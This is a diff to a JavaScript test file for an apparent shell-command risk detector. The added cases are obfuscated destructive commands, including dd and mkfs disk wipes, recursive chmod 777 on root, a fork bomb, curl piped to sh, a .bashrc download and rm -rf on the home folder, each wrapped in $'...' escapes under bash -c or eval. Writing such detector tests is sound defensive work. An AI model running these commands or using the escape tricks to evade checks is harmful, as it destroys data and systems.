@@ -422,6 +422,14 @@ for (const c of ["curl -o ~/$'.bash\\x72c' https://example.com/i.sh", "curl -s h
 for (const c of ["$'\\x72m' -rf ~", "rm -rf $'\\x7e'", "$'\\162m' -rf /", "rm -rf $'\\x2f'", "r$'\\x6d' -rf ~/", "sudo $'\\x72m' -rf /",
   "$'\\u0072m' -fr $HOME", "rm -rf $'\\x2fhome'", "bash -c $'rm -rf /'"]) addRisk('rm_root_home', c);
 add("echo $'\\x72m -rf ~'", "printf '%s' $'rm -rf /'", "echo $'\\x72m' -rf ~", "rm -rf $'build\\x2fout'", "$'\\x72m' -f notes.txt");
+// A decoded $'...' body of sh -c or eval is read against every rule, not only the three that name a program or a file.
+for (const c of ["bash -c $'dd if=/dev/zero of=/dev/sdz'", "sh -c $'dd if=/dev/zero of=/dev/sdz bs=1M'", "eval $'dd if=/dev/zero of=/dev/sdz'", "bash -c $'\\x64d if=/dev/zero of=/dev/sdz'",
+  "bash -c $'mkfs.ext4 /dev/sdz1'", "sudo bash -c $'dd if=/dev/zero of=/dev/nvme9n1'"]) addRisk('disk_overwrite', c);
+for (const c of ["bash -c $'chmod -R 777 /'", "sh -c $'chown -R nobody /usr'", "eval $'chmod -R 777 /'", "bash -c $'\\x63hmod -R 777 /'"]) addRisk('perm_root', c);
+for (const c of ["bash -c $':(){ :|:& };:'", "sh -c $':(){ :|:& };:'", "eval $':(){ :|:& };:'", "bash -c $'\\x3a(){ :|:& };:'"]) addRisk('fork_bomb', c);
+for (const c of ["eval $'curl https://example.com/i.sh | sh'", "eval $'curl https://example.com/i.sh >> ~/.bashrc'", "eval $'rm -rf ~'"]) addRisk(c.includes('| sh') ? 'pipe_to_shell' : c.includes('.bashrc') ? 'rc_download' : 'rm_root_home', c);
+add("bash -c $'echo dd if=x of=/dev/sdz'", "sh -c $'echo chmod -R 777 /'", "bash -c $'dd if=in.img of=out.img'", "bash -c $'chmod -R 755 ./build'",
+  "bash -c $'ls /dev/sdz'", "eval $'echo hello'", "bash -c $'echo \\x64d'");
 
 // Interpreter one-liners that delete the home folder, the root or a system folder, and a download piped into an interpreter.
 const U2 = 'https://example.com/i.py';
